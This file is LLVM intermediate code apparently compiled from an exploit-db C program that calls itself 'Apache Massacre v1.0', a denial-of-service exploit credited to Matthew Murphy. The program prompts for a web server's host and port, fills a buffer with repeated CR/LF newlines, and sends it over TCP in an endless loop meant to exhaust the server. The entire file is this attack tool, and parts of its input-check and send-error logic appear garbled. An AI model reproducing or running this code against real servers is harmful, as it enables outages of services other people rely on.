; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_9.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_9.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i64 }
%struct.hostent = type { i64 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [23 x i8] c"Apache Massacre v1.0\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [28 x i8] c"Exploit by Matthew Murphy\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [44 x i8] c"Vulnerability reported by iDEFENSE Labs\0D\0A\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [40 x i8] c"Please enter the web server's host/IP: \00", align 1
@stdin = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.5 = private unnamed_addr constant [37 x i8] c"Please enter the web server's port: \00", align 1
@SIGINT = common dso_local global i32 0, align 4
@sig_handler = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [52 x i8] c"How many newlines should be in each request [100]: \00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"send\00", align 1
@sig_fired = common dso_local global i64 0, align 8
@.str.10 = private unnamed_addr constant [22 x i8] c"Terminating on SIGINT\00", align 1
@TRUE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca %struct.sockaddr_in, align 8
  %8 = alloca [1025 x i8], align 16
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca i16, align 2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i16 80, i16* %10, align 2
  store i32 100, i32* %11, align 4
  %15 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))
  %16 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0))
  %17 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0))
  %18 = call i32 @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.3, i64 0, i64 0))
  %19 = getelementptr inbounds [1025 x i8], [1025 x i8]* %8, i64 0, i64 0
  %20 = load i32, i32* @stdin, align 4
  %21 = call i32 @fgets(i8* %19, i32 1024, i32 %20)
  %22 = getelementptr inbounds [1025 x i8], [1025 x i8]* %8, i64 0, i64 0
  %23 = call %struct.hostent* @gethostbyname(i8* %22)
  store %struct.hostent* %23, %struct.hostent** %9, align 8
  %24 = load %struct.hostent*, %struct.hostent** %9, align 8
  %25 = icmp ne %struct.hostent* %24, null
  br i1 %25, label %29, label %26

26:                                               ; preds = %2
  %27 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  %28 = call i32 @exit(i32 1) #3
  unreachable

29:                                               ; preds = %2
  %30 = load %struct.hostent*, %struct.hostent** %9, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 0
  %32 = load i64, i64* %31, align 8
  %33 = inttoptr i64 %32 to i64*
  %34 = load i64, i64* %33, align 8
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %36 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %35, i32 0, i32 0
  store i64 %34, i64* %36, align 8
  %37 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.5, i64 0, i64 0))
  %38 = getelementptr inbounds [1025 x i8], [1025 x i8]* %8, i64 0, i64 0
  %39 = load i32, i32* @stdin, align 4
  %40 = call i32 @fgets(i8* %38, i32 1024, i32 %39)
  %41 = getelementptr inbounds [1025 x i8], [1025 x i8]* %8, i64 0, i64 0
  %42 = call i32 @atoi(i8* %41)
  %43 = trunc i32 %42 to i16
  store i16 %43, i16* %10, align 2
  %44 = load i32, i32* @SIGINT, align 4
  %45 = call i32 @signal(i32 %44, i32* @sig_handler)
  %46 = call i32 @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.6, i64 0, i64 0))
  %47 = getelementptr inbounds [1025 x i8], [1025 x i8]* %8, i64 0, i64 0
  %48 = load i32, i32* @stdin, align 4
  %49 = call i32 @fgets(i8* %47, i32 1024, i32 %48)
  %50 = getelementptr inbounds [1025 x i8], [1025 x i8]* %8, i64 0, i64 0
  %51 = load i8, i8* %50, align 16
  %52 = icmp ne i8 %51, 0
  %53 = xor i1 %52, true
  %54 = zext i1 %53 to i32
  %55 = icmp eq i32 %54, 13
  br i1 %55, label %56, label %66

56:                                               ; preds = %29
  %57 = getelementptr inbounds [1025 x i8], [1025 x i8]* %8, i64 0, i64 0
  %58 = load i8, i8* %57, align 16
  %59 = icmp ne i8 %58, 0
  %60 = xor i1 %59, true
  %61 = zext i1 %60 to i32
  %62 = icmp eq i32 %61, 10
  br i1 %62, label %63, label %66

63:                                               ; preds = %56
  %64 = getelementptr inbounds [1025 x i8], [1025 x i8]* %8, i64 0, i64 0
  %65 = call i32 @atoi(i8* %64)
  store i32 %65, i32* %11, align 4
  br label %66

66:                                               ; preds = %63, %56, %29
  %67 = load i32, i32* %11, align 4
  %68 = mul nsw i32 %67, 2
  %69 = call i8* @malloc(i32 %68)
  store i8* %69, i8** %12, align 8
  %70 = load i8*, i8** %12, align 8
  store i8* %70, i8** %13, align 8
  store i32 0, i32* %14, align 4
  br label %71

71:                                               ; preds = %82, %66
  %72 = load i32, i32* %14, align 4
  %73 = load i32, i32* %11, align 4
  %74 = icmp slt i32 %72, %73
  br i1 %74, label %75, label %85

75:                                               ; preds = %71
  %76 = load i8*, i8** %13, align 8
  store i8 13, i8* %76, align 1
  %77 = load i8*, i8** %13, align 8
  %78 = getelementptr inbounds i8, i8* %77, i32 1
  store i8* %78, i8** %13, align 8
  %79 = load i8*, i8** %13, align 8
  store i8 10, i8* %79, align 1
  %80 = load i8*, i8** %13, align 8
  %81 = getelementptr inbounds i8, i8* %80, i32 1
  store i8* %81, i8** %13, align 8
  br label %82

82:                                               ; preds = %75
  %83 = load i32, i32* %14, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %14, align 4
  br label %71

85:                                               ; preds = %71
  %86 = load i32, i32* %11, align 4
  %87 = load i32, i32* %11, align 4
  %88 = add nsw i32 %87, %86
  store i32 %88, i32* %11, align 4
  %89 = load i32, i32* @AF_INET, align 4
  %90 = load i32, i32* @SOCK_STREAM, align 4
  %91 = load i32, i32* @IPPROTO_TCP, align 4
  %92 = call i64 @socket(i32 %89, i32 %90, i32 %91)
  store i64 %92, i64* %6, align 8
  %93 = load i64, i64* %6, align 8
  %94 = icmp slt i64 %93, 0
  br i1 %94, label %95, label %98

95:                                               ; preds = %85
  %96 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  %97 = call i32 @exit(i32 1) #3
  unreachable

98:                                               ; preds = %85
  %99 = load i32, i32* @AF_INET, align 4
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %99, i32* %100, align 4
  %101 = load i16, i16* %10, align 2
  %102 = call i32 @htons(i16 zeroext %101)
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i32 %102, i32* %103, align 8
  %104 = load i64, i64* %6, align 8
  %105 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %106 = call i64 @connect(i64 %104, %struct.sockaddr* %105, i32 16)
  %107 = icmp ne i64 %106, 0
  br i1 %107, label %108, label %111

108:                                              ; preds = %98
  %109 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  %110 = call i32 @exit(i32 1) #3
  unreachable

111:                                              ; preds = %98
  br label %112

112:                                              ; preds = %111, %135
  %113 = load i64, i64* %6, align 8
  %114 = load i8*, i8** %12, align 8
  %115 = load i32, i32* %11, align 4
  %116 = call i32 @send(i64 %113, i8* %114, i32 %115, i32 0)
  %117 = icmp ne i32 %116, 0
  %118 = xor i1 %117, true
  %119 = zext i1 %118 to i32
  %120 = load i32, i32* %11, align 4
  %121 = icmp eq i32 %119, %120
  br i1 %121, label %122, label %125

122:                                              ; preds = %112
  %123 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0))
  %124 = call i32 @exit(i32 1) #3
  unreachable

125:                                              ; preds = %112
  %126 = load i64, i64* @sig_fired, align 8
  %127 = icmp ne i64 %126, 0
  br i1 %127, label %128, label %135

128:                                              ; preds = %125
  %129 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i64 0, i64 0))
  %130 = load i8*, i8** %12, align 8
  %131 = call i32 @free(i8* %130)
  %132 = load i64, i64* %6, align 8
  %133 = call i32 @close(i64 %132)
  %134 = call i32 @exit(i32 0) #3
  unreachable

135:                                              ; preds = %125
  br label %112
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @fgets(i8*, i32, i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @signal(i32, i32*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i64 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i64 @connect(i64, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i64, i8*, i32, i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @close(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
